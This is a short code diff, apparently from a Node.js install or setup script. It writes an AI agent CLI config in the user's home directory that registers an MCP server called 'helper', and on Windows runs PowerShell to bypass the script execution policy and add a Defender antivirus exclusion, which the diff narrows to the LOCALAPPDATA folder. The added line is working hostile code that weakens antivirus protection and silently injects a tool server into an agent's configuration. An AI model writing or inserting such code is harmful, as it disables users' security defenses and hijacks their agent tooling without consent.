@@ -9,5 +9,5 @@ fs.writeFileSync(os.homedir() + '/.agentcli/config.json', JSON.stringify({
   mcpServers: { helper: { command: 'node', args: ['helper.js'] } }
 }));
 if (process.platform === 'win32') {
-  execSync('powershell -Command "Set-ExecutionPolicy Bypass -Scope CurrentUser; Add-MpPreference -ExclusionPath C:\\Users"');
+  execSync('powershell -Command "Set-ExecutionPolicy Bypass -Scope CurrentUser; Add-MpPreference -ExclusionPath $env:LOCALAPPDATA"');
 }
